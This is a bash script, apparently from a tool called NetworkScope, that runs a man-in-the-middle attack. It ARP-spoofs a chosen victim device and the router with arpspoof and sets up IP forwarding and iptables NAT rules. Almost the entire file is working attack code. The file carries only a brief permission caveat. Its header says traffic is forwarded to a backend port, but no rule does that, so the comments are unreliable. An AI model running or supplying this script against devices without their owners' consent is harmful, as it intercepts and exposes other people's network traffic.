#!/usr/bin/env bash

# ARP Redirection (Method 2) for NetworkScope
# -------------------------------------------------
# This script enables traffic capture for a target device by performing
# ARP spoofing (MITM) between the victim and the router, then forwards
# the traffic to the NetworkScope backend (running on this host).
#
# Prerequisites:
#   - Linux host (or WSL) with sudo privileges.
#   - `arpspoof` (package `dsniff`) installed.
#   - IP forwarding enabled.
#   - NetworkScope backend listening on PORT_BACKEND (default 8000).
#   - The host IP (`HOST_IP`) must be reachable by both victim and router.
#
# Usage:
#   sudo ./arp_redirect.sh <victim_ip> <router_ip> [backend_port]
#
# Example:
#   sudo ./arp_redirect.sh 192.168.1.45 192.168.1.1 8000
#
# Safety notes:
#   * This script performs a classic MITM attack. Use only on networks you own or have permission to test.
#   * Stop the script with Ctrl+C; it will clean up iptables and restore the original ARP tables.
#   * The script does NOT modify router configuration.

set -euo pipefail

if [[ "$EUID" -ne 0 ]]; then
  echo "[!] Please run as root (sudo)"
  exit 1
fi

if [[ $# -lt 2 || $# -gt 3 ]]; then
  echo "Usage: $0 <victim_ip> <router_ip> [backend_port]"
  exit 1
fi

VICTIM_IP="$1"
ROUTER_IP="$2"
BACKEND_PORT="${3:-8000}"
HOST_IP=$(hostname -I | awk '{print $1}')

echo "[+] Victim:   $VICTIM_IP"
echo "[+] Router:   $ROUTER_IP"
echo "[+] Host IP:  $HOST_IP"
echo "[+] Backend:  http://$HOST_IP:$BACKEND_PORT"

# Enable IP forwarding
echo "[+] Enabling IP forwarding"
sysctl -w net.ipv4.ip_forward=1 > /dev/null

# Set up NAT so that forwarded packets appear to come from the host
echo "[+] Configuring iptables NAT"
iptables -t nat -A POSTROUTING -s $VICTIM_IP -j MASQUERADE
iptables -t nat -A PREROUTING -d $HOST_IP -j DNAT --to-destination $VICTIM_IP

# Start arpspoof in background for both directions
echo "[+] Starting arpspoof (victim -> router)"
arpspoof -i $(ip route get $VICTIM_IP | awk '{print $5; exit}') -t $VICTIM_IP $ROUTER_IP &
PID_V2R=$!

echo "[+] Starting arpspoof (router -> victim)"
arpspoof -i $(ip route get $VICTIM_IP | awk '{print $5; exit}') -t $ROUTER_IP $VICTIM_IP &
PID_R2V=$!

# Trap Ctrl+C to clean up
cleanup() {
  echo "\n[!] Caught interrupt – cleaning up"
  echo "[+] Killing arpspoof processes"
  kill $PID_V2R $PID_R2V 2>/dev/null || true
  echo "[+] Removing iptables rules"
  iptables -t nat -D POSTROUTING -s $VICTIM_IP -j MASQUERADE || true
  iptables -t nat -D PREROUTING -d $HOST_IP -j DNAT --to-destination $VICTIM_IP || true
  echo "[+] Disabling IP forwarding"
  sysctl -w net.ipv4.ip_forward=0 > /dev/null
  echo "[+] Done."
  exit 0
}
trap cleanup SIGINT SIGTERM

echo "[+] ARP redirect active. Press Ctrl+C to stop."
# Wait forever (or until killed)
while true; do sleep 60; done
